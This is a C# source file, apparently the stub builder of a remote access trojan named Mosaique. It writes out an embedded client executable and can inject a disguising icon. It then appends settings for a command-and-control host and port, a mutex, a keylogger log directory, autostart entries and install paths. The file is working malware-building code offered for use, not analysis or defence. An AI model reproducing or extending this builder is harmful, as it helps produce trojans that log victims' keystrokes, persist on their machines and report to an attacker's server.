using MosaiqueServeur.Controllers;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    class FrmBuilderController
    {
        //Propriétés
        public string ReconnectTries { get; set; }
        public string s;        

        public void create_stub(string host, string port, string mutex, string recoTries, string identifier,
             string logDir, string startupName, string txtSubDirI, string txtFileNameI, string installPath, string chkPart,bool chkIcon, string iconPath)
        {            
            if (chkIcon)
            {
                if (!File.Exists(iconPath)){
                    MessageBox.Show("Icon not found !");
                    return;
                }
                if (Path.GetExtension(iconPath) != ".ico")
                {
                    MessageBox.Show("Only .ico is allowed for stub icon !");
                    return;
                }
            }

            SaveFileDialog save_file = new SaveFileDialog();
            try
            {
                s = save_file.FileName;               
                save_file.Filter = "Application |*.exe";
                if (save_file.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllBytes(Application.StartupPath + "\\client.exe", MosaiqueServeur.Properties.Resources.Client);
                    if (chkIcon)
                        IconInjectorController.InjectIcon(Application.StartupPath + "\\client.exe", iconPath);
                    File.Copy(Application.StartupPath + "\\client.exe", save_file.FileName);
                    FileStream stream = new FileStream(save_file.FileName, FileMode.Append);
                    BinaryWriter writer = new BinaryWriter(stream);
                    // LOG IN SETTINGS
                    writer.Write("-STARThost-" + host + "-ENDhost-");
                    writer.Write("-STARTport-" + port + "-ENDport-");
                    writer.Write("-STARTmutex-" + getUniqueMutex(18) + "-ENDmutex-");
                    writer.Write("-STARTrecoTries-" + recoTries + "-ENDrecoTries-");
                    writer.Write("-STARTidentifier-" + identifier + "-ENDidentifier-");
                    // KEYLOGGER SETTINGS
                    writer.Write("-STARTlogDir-" + logDir + "-ENDlogDir-");
                    // AUTOSTART SETTINGS
                    writer.Write("-STARTstartupName-" + startupName + "-ENDstartupName-");
                    // INSTALL SETTINGS
                    writer.Write("-STARTinstallPath-" + installPath + "-ENDinstallPath-");
                    writer.Write("-STARTtxtSubDirI-" + txtSubDirI + "-ENDtxtSubDirI-");
                    writer.Write("-STARTtxtFileNameI-" + txtFileNameI + "-ENDtxtFileNameI-");
                    // BOOLEENS
                    writer.Write("-STARTchk-" + chkPart + "-ENDchk-");
                    writer.Flush();
                    writer.Close();
                    stream.Close();
                    File.Delete(Application.StartupPath + "\\client.exe");                    
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public string getUniqueMutex(int maxSize)
        {
            char[] chars = new char[62];
            chars =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data = new byte[1];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetNonZeroBytes(data);
                data = new byte[maxSize];
                crypto.GetNonZeroBytes(data);
            }
            StringBuilder result = new StringBuilder(maxSize);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return "MOSAIC_Mutex_" + result.ToString();
        }
    }
}
